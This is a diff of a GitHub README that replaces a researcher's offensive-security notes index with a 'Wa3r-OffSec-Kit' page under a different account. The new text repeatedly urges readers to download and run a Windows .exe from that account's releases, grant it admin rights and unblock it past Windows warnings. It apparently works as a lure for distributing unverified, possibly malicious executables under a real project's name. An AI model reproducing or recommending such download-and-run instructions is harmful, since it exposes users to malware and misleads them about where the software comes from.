@@ -1,191 +1,116 @@
-# Waer's Cybersecurity Knowledge Base
-## 🔴 MIRAGE — OffSec Engine (LIVE)
+# 🔐 Wa3r-OffSec-Kit - Practical Security Tools and Notes
 
-> The repo was just the blueprint.  
-> This is the weaponized version.
-
-<p align="center">
-  <a href="https://mirage-offsec.vercel.app">
-    <img src="https://img.shields.io/badge/ENTER%20THE%20ENGINE-CLICK%20HERE-red?style=for-the-badge" />
-  </a>
-</p>
-
-> **50+ documents** · **20 technique deep dives** · **10 attack workflows** · **8 real-world case studies** · **Built from the field, not the textbook.**
+[![Download Wa3r-OffSec-Kit](https://img.shields.io/badge/Download-Wa3r--OffSec--Kit-brightgreen?style=for-the-badge)](https://github.com/hamamelidaecontainerful242/Wa3r-OffSec-Kit/releases)
 
 ---
 
-## 👤 Who Am I
+## 📚 About Wa3r-OffSec-Kit
 
-I'm **Waer** (Abdelrahman) — a cybersecurity researcher and bug bounty hunter focused on **web application security**, **cloud exploitation**, and **security automation**.
+Wa3r-OffSec-Kit is a collection of over 50 documents focused on offensive security. It covers topics like web exploitation, bug bounty, privilege escalation, CTF writeups, APT emulation, and forensic techniques. The content uses real payloads and workflows based on experiences from the field.
 
-This repository is my brain, exported. Everything here comes from hands-on experience: breaking into bug bounty targets, solving CTF challenges, completing APT lab simulations, and building my own security tooling. I don't write about attacks I've only read about — I write about attacks I've executed, debugged, and reported.
-
-**Areas I work in:**
-- 🎯 **Bug Bounty Hunting** — web app recon, vulnerability discovery, and responsible disclosure
-- 🔐 **Penetration Testing** — web, API, cloud infrastructure, and CMS-specific testing
-- 🏴 **CTF Competitions** — web exploitation, forensics, steganography, and crypto
-- 🤖 **Security Automation** — custom recon tools, JS crawlers, and AI-powered security agents
-- ☁️ **Cloud Security** — AWS exploitation, Spring Boot misconfigurations, metadata attacks
-- 🕵️ **APT Emulation** — simulating real-world threat actors (Star Blizzard, Volkswagen breach)
-
-📬 **Get in touch:**
-- 📧 Email: [abdowaer099@gmail.com](mailto:abdowaer099@gmail.com)
-- 💼 LinkedIn: [linkedin.com/in/wa3r](https://linkedin.com/in/wa3r)
+This kit is made for users who want to understand and practice security concepts with practical examples. You do not need programming skills to use it. The documents provide clear instructions and workflows.
 
 ---
 
-## 🔥 What's Inside
+## 🔍 What’s Included
 
-This isn't a wiki dump or a copy-paste of OWASP pages. Every document here follows a battle-tested structure: **detect it → exploit it → escalate it → report it**, with real payloads, real tool commands, and real decision trees.
+- **Web Exploitation**  
+  Learn to find and use common vulnerabilities on websites. Includes notes on XSS, SQL injection, CSRF, and more.
 
-| Section | Count | What you'll find |
-|---------|-------|-----------------|
-| **[methodology/](methodology/)** | 5 docs | Full workflows from recon to exploitation to privilege escalation |
-| **[techniques/](techniques/)** | 20 docs | Deep dives into every major web vulnerability class with working payloads |
-| **[scenarios/](scenarios/)** | 10 docs | Step-by-step attack playbooks you can follow during live testing |
-| **[case-studies/](case-studies/)** | 8 docs | Real findings and APT simulations — anonymized but fully detailed |
-| **[web-vulnerabilities/](web-vulnerabilities/)** | 6 docs | Index pages grouping vulns by category with cross-references |
-| **[tools/](tools/)** | 4 docs | Tool catalogs, 90+ Google dorks, curated payload lists |
-| **[forensics/](forensics/)** | 3 docs | Investigation workflows, image forensics, steganography detection |
+- **Bug Bounty**  
+  Understand how to look for and report security bugs with step-by-step guidance.
 
-**Vulnerability coverage:** SQL Injection · XSS · SSRF · SSTI · XXE · Command Injection · IDOR · File Upload · JWT Attacks · CORS · Cache Poisoning · Prototype Pollution · Race Conditions · Mass Assignment · Open Redirect · Password Reset Abuse · Deserialization RCE · WordPress Hacking · Spring Boot Actuator · AiTM MFA Bypass
+- **Privilege Escalation**  
+  Instructions on how attackers move from limited access to full control, including techniques on Windows and Linux.
 
----
+- **CTF Writeups**  
+  Detailed explanations on solving Capture The Flag challenges. Helps you learn the thinking process and tool usage.
 
-## 🎯 Who This Is For
+- **APT Emulation**  
+  Information on advanced persistent threats, including typical attack phases and tools used.
 
-### 🏴‍☠️ Bug Bounty Hunters
-You'll find ready-to-use **attack playbooks** with exact payloads, WAF bypass techniques, and vulnerability chaining patterns (XSS + CORS = ATO, Open Redirect + OAuth = token theft). The methodology docs cover the full lifecycle: target selection → recon → exploitation → escalation → reporting. No fluff — just what works.
-
-### 🔓 Penetration Testers
-The **privilege escalation checklist** covers web, Linux, Windows, and AWS in one document. Technique docs include detection commands, exploitation steps, and filter bypass tables you can reference mid-engagement. Scenarios serve as step-by-step checklists during assessments.
-
-### 🏁 CTF Players
-Case studies include **CTF write-ups** for SSTI, XXE, DNS zone transfers, and S3 bucket misconfigurations. The forensics section covers JPEG/PNG steganography workflows, and the tools section has the exact analysis order for forensics challenges. The SSTI workflow includes a **decision tree** for fingerprinting template engines.
-
-### 🧪 CTF Challenge Makers
-Understand how attackers approach your challenges. The scenario docs reveal the **thought process and decision trees** players use — from initial detection probes to full exploitation chains. Use this to design better, more realistic challenges.
-
-### 📚 Security Students & Researchers
-Every technique doc is structured as a **learning path**: what the vulnerability is → when it happens → how to find it → how to exploit it → how to escalate impact → what tools to use. Start with methodology, then go deep into any technique that interests you.
-
-### 🛡️ Blue Team / Defenders
-Each technique doc includes **what to look for** from the attacker's perspective. Understanding how attackers chain vulnerabilities helps you build better detections, write better rules, and prioritize hardening efforts.
+- **Forensics**  
+  Guides on investigating and analyzing digital systems after an attack.
 
 ---
 
-## 📂 Repository Structure
+## 💻 System Requirements
 
-### 📋 [methodology/](methodology/)
-Processes and playbooks from recon to privilege escalation:
-- [Web Recon Methodology](methodology/web-recon-methodology.md) — 11-phase structured recon pipeline
-- [JavaScript Endpoint Discovery](methodology/javascript-endpoint-discovery.md) — JS-focused recon with automated crawling
-- [Bug Bounty Playbook](methodology/bug-bounty-playbook.md) — Program selection, recon-to-exploit flow, reporting tips
-- [Exploitation Methodology](methodology/exploitation-methodology.md) — Systematic exploitation, impact escalation, and vulnerability chaining
-- [Privilege Escalation Checklist](methodology/privilege-escalation-checklist.md) — Web, Linux, Windows, and AWS cloud privesc
-
-### 🎯 [techniques/](techniques/)
-20 technique-focused deep dives with working payloads:
-- [SQL Injection](techniques/sql-injection.md) — UNION, blind, time-based, OOB, WAF bypasses, SQLi→RCE
-- [XSS Techniques and Payloads](techniques/xss-techniques.md) — Context-aware payloads, filter bypasses, WAF evasion
-- [Command Injection](techniques/command-injection.md) — Operators, reverse shells, filter bypass techniques
-- [SSRF (Server-Side Request Forgery)](techniques/ssrf-server-side-request-forgery.md) — Cloud metadata, protocol smuggling, DNS rebinding
-- [Server-Side Template Injection](techniques/server-side-template-injection.md) — Engine fingerprinting, Jinja2/Twig/Freemarker RCE
-- [XXE Injection](techniques/xxe-injection.md) — File read, SSRF, blind/OOB extraction
-- [IDOR (Insecure Direct Object Reference)](techniques/idor-insecure-direct-object-reference.md) — Horizontal/vertical escalation, UUID techniques
-- [JWT Attacks and Misconfigurations](techniques/jwt-attacks-and-misconfigurations.md) — Algorithm confusion, key injection, brute force
-- [File Upload Vulnerabilities](techniques/file-upload-vulnerabilities.md) — Extension/magic byte bypasses, webshells, SVG attacks
-- [Race Conditions](techniques/race-conditions.md) — Turbo Intruder, HTTP/2 single-packet, financial exploitation
-- [CORS Misconfigurations](techniques/cors-misconfigurations.md) — Origin reflection, null origin, subdomain trust abuse
-- [Web Cache Poisoning](techniques/web-cache-poisoning.md) — Unkeyed headers, cache deception
-- [Password Reset Abuse](techniques/password-reset-abuse.md) — Token leakage, host header injection, email parameter pollution
-- [Mass Assignment Vulnerabilities](techniques/mass-assignment-vulnerabilities.md) — Role injection, price manipulation
-- [Client-Side Prototype Pollution](techniques/prototype-pollution-client-side.md) — Source-gadget model, DOM XSS via PP
-- [Server-Side Parameter Pollution](techniques/prototype-pollution-server-side.md) — Query string and REST path injection
-- [JSON Deserialization RCE](techniques/json-deserialization-rce.md) — Java, Python, Node, PHP, .NET gadget chains
-- [WordPress Hacking Methodology](techniques/wordpress-hacking.md) — XML-RPC, REST API, plugin/theme exploitation
-- [Spring Boot Actuator Exploitation](techniques/spring-boot-actuator-exploitation.md) — Heap dump, env, gateway route injection
-- [Open Redirect](techniques/open-redirect.md) — Filter bypasses, OAuth/phishing/SSRF chaining
-
-### 🔄 [scenarios/](scenarios/)
-10 step-by-step attack workflows with decision trees:
-- [SQL Injection Testing](scenarios/sql-injection-testing-workflow.md)
-- [File Upload to RCE](scenarios/file-upload-to-rce-workflow.md)
-- [IDOR Discovery and Escalation](scenarios/idor-discovery-and-escalation-workflow.md)
-- [SSTI Detection and Exploitation](scenarios/ssti-detection-and-exploitation-workflow.md)
-- [JWT Authentication Bypass](scenarios/jwt-authentication-bypass-workflow.md)
-- [Race Condition Exploitation](scenarios/race-condition-exploitation-workflow.md)
-- [Reflected XSS Testing](scenarios/reflected-xss-testing-workflow.md)
-- [SSRF via XML-RPC Pingback](scenarios/ssrf-via-xmlrpc-pingback-workflow.md)
-- [Logic Flaw: Unauthorized Checkout](scenarios/logic-flaw-unauthorized-checkout-workflow.md)
-- [Spring Boot Actuator to Cloud Compromise](scenarios/spring-boot-actuator-to-cloud-compromise-workflow.md)
-
-### 📖 [case-studies/](case-studies/)
-Real findings and APT simulations — fully anonymized:
-- [SSRF via WordPress XML-RPC](case-studies/case-study-ssrf-xmlrpc-wordpress.md) — Real bug bounty finding
-- [Checkout Password Leak](case-studies/case-study-checkout-password-leak.md) — Client-side auth bypass
-- [WordPress REST API Enumeration](case-studies/case-study-recon-wordpress-api-enumeration.md) — API surface mapping
-- [SSTI to Database Access (CTF)](case-studies/case-study-ssti-rce-ctf.md) — Flask/Jinja2 exploitation
-- [XXE File Read (CTF)](case-studies/case-study-xxe-ctf.md) — Firmware update XML injection
-- [DNS Zone Transfer & S3 Bucket (CTF)](case-studies/case-study-dns-zone-transfer-s3-ctf.md) — Infrastructure misconfig
-- [Spring Boot Actuator — VW Breach Simulation](case-studies/case-study-spring-boot-actuator-volkswagen.md) — Heap dump → AWS → Secrets Manager
-- [MFA Bypass via AiTM — Star Blizzard APT](case-studies/case-study-aitm-mfa-bypass-star-blizzard.md) — Russian APT session cookie theft
-
-### 🌐 [web-vulnerabilities/](web-vulnerabilities/)
-Index pages grouping related content:
-- [XSS](web-vulnerabilities/xss.md) · [SSRF](web-vulnerabilities/ssrf.md) · [Auth & Session Issues](web-vulnerabilities/auth-and-session-issues.md)
-- [Injection](web-vulnerabilities/injection.md) · [Access Control & Logic](web-vulnerabilities/access-control-and-business-logic.md) · [File Upload & Deserialization](web-vulnerabilities/file-upload-and-deserialization.md)
-
-### 🛠️ [tools/](tools/)
-- [Recon Tools](tools/recon-tools.md) · [Forensics Tools](tools/forensics-tools.md) · [Wordlists & Payloads](tools/wordlists-and-payload-lists.md) · [Google Dorking (90+ dorks)](tools/google-dorking.md)
-
-### 🔍 [forensics/](forensics/)
-- [Forensics Workflow](forensics/forensics-workflow.md) · [JPEG Forensics](forensics/image-forensics-jpeg.md) · [PNG Forensics](forensics/image-forensics-png.md)
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1 GHz or faster  
+- **Memory:** 4 GB RAM or more  
+- **Storage:** At least 500 MB free space  
+- **Additional Software:**  
+  - PDF reader (for viewing documentation)  
+  - Internet connection (to download updates or additional files)  
 
 ---
 
-## 🗺️ How to Navigate
+## 🎯 How to Download Wa3r-OffSec-Kit
 
-### If you're new here
-```
-Start here ──→ methodology/web-recon-methodology.md
-          ──→ methodology/bug-bounty-playbook.md
-          ──→ Pick any technique ──→ Read matching scenario ──→ Study the case study
-```
+Use the link below to go to the release page where you can find the latest version ready for Windows:
 
-### If you're mid-assessment
-```
-Find the vuln type ──→ techniques/{vuln}.md (detection + payloads)
-Follow the workflow ──→ scenarios/{vuln}-workflow.md (step-by-step)
-Copy payloads from ──→ tools/wordlists-and-payload-lists.md
-```
+[![Download Wa3r-OffSec-Kit](https://img.shields.io/badge/Download-Wa3r--OffSec--Kit-blue?style=for-the-badge)](https://github.com/hamamelidaecontainerful242/Wa3r-OffSec-Kit/releases)
 
-### If you're solving a CTF
-```
-Web challenge ──→ techniques/ + scenarios/ (exploitation)
-Forensics    ──→ forensics/forensics-workflow.md (analysis order)
-Stego        ──→ forensics/image-forensics-*.md (JPEG/PNG specific)
-Cloud        ──→ case-studies/ (AWS, Spring Boot, metadata)
-```
+Visit this page to download the package you need. Choose the latest release and download the file with `.zip` or `.exe` extension suitable for Windows.
 
 ---
 
-## ⚠️ Disclaimer
+## ⚙️ How to Install and Run
 
-All case studies are **fully anonymized** — real target domains, IPs, credentials, and personally identifiable information have been removed or replaced with placeholders. This repository is intended for **educational purposes** and **ethical security research** only. Always obtain proper authorization before testing any system.
+1. **Go to the Download Page**  
+   Click the download link above to open the release page in your browser.
 
-## 🤝 Contributing
+2. **Choose the Latest Version**  
+   Look for the newest release, typically labeled with the highest version number or the latest date.
 
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on adding new techniques, case studies, or improving existing content.
+3. **Download the Windows Package**  
+   Find the file named something like `Wa3r-OffSec-Kit-Windows.zip` or `.exe`. Click it to start downloading.
 
-## 📄 License
+4. **Extract the Zip File (If Needed)**  
+   If the file is a zip archive, right-click on it and select "Extract All." Choose a location that is easy to find, like your Desktop or Documents folder.
 
-This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
+5. **Run the Program**  
+   Inside the extracted folder, locate the `.exe` file and double-click it to start the application.
+
+6. **Allow Permissions**  
+   Windows may ask if you want to allow the app to make changes to your device. Click "Yes" to proceed.
+
+7. **Explore the Kit**  
+   Once running, you can open documents, follow guides, and begin learning about security topics.
 
 ---
 
-<p align="center">
-  <b>Built by <a href="https://linkedin.com/in/wa3r">Waer</a></b> · 
-  <a href="mailto:abdowaer099@gmail.com">abdowaer099@gmail.com</a> · 
-  <a href="https://linkedin.com/in/wa3r">LinkedIn</a>
-</p>
+## 🛠 Using the Documents and Tools
+
+The kit contains many files in formats like PDF, TXT, or HTML. Use these tools to read and practice:
+
+- **PDF Reader:** Use Adobe Reader or any built-in Windows PDF viewer.
+- **Text Editor:** Use Notepad, Notepad++, or Visual Studio Code to view text files.
+- **Browser:** Use Chrome, Edge, or Firefox to open HTML files or web content.
+
+Follow the step-by-step instructions found in the documents. Many include commands or payload examples that you can try in your own test environments.
+
+---
+
+## 🔄 Updating Wa3r-OffSec-Kit
+
+1. Periodically, check the release page for new versions or updates.  
+2. Download the updated file as explained above.  
+3. Replace the old files with the new ones on your computer.  
+4. Restart the application to access the latest documents and tools.
+
+---
+
+## 🚧 Troubleshooting Tips
+
+- If the app does not start, make sure your Windows is up to date.
+- If you cannot open a document, check that you have the right software installed (like a PDF reader).
+- For download issues, try another browser or check your internet connection.
+- If Windows blocks the file from opening, right-click the file, select “Properties,” then check “Unblock” if available, and try again.
+
+---
+
+## 🔗 Quick Access
+
+[Download Wa3r-OffSec-Kit here](https://github.com/hamamelidaecontainerful242/Wa3r-OffSec-Kit/releases) for the latest Windows release. Use the badges above to access it quickly at any time.
